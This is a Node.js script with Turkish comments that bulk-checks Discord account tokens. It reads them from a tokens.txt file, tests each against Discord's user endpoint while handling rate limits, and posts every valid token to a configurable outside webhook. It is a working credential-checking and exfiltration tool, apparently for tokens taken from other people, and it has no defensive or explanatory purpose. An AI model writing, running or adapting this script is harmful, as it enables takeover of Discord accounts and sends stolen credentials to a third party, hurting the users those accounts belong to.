const axios = require('axios');
const fs = require('fs');
const readline = require('readline');

// Webhook URL'nizi buraya ekleyin
const webhookURL = '';

// Token dosyasını okuyucu oluştur
const fileStream = fs.createReadStream('tokens.txt');
const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
});

// Token geçerliliğini kontrol eden fonksiyon
async function checkTokenValidity(token) {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me', {
            headers: {
                'Authorization': token
            }
        });
        return response.status === 200;
    } catch (error) {
        if (error.response && error.response.status === 429) {
            console.log('Hız sınırı aşıldı, bekleniyor...');
            // Retry-After başlığı varsa, belirtilen süre boyunca bekleyin
            const retryAfter = error.response.headers['retry-after'];
            const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : 60000; // Varsayılan olarak 60 saniye bekleyin
            await new Promise(resolve => setTimeout(resolve, waitTime));
            return checkTokenValidity(token);
        }
        return false;
    }
}

// Geçerli tokeni Webhook'a gönderme fonksiyonu
async function sendTokenToWebhook(token) {
    try {
        const embed = {
            title: "Geçerli Token Bulundu!",
            description: `**Token:** \`${token}\``,
            color: 3066993 // Green color
        };
        await axios.post(webhookURL, {
            content: '',
            embeds: [embed]
        });
        console.log(`${token} > GEÇERLİ WEBHOOK'A AKTARILDI!`);
    } catch (error) {
        console.error('Webhook gönderme hatası:', error);
    }
}

// Token kontrol döngüsü
async function processTokens() {
    for await (const token of rl) {
        try {
            const isValid = await checkTokenValidity(token);
            if (isValid) {
                await sendTokenToWebhook(token);
            } else {
                console.log(`${token} > GEÇERSİZ`);
            }
            // Her tokeni kontrol ettikten sonra bekleme süresi
            await new Promise(resolve => setTimeout(resolve, 2000)); // 2 saniye bekle
        } catch (error) {
            console.error('Token kontrol edilirken bir hata oluştu, tekrar deneniyor...', error);
            await new Promise(resolve => setTimeout(resolve, 5000)); // Hata durumunda bekleme süresi
        }
    }
}

// Token kontrol işlemini başlat
processTokens();
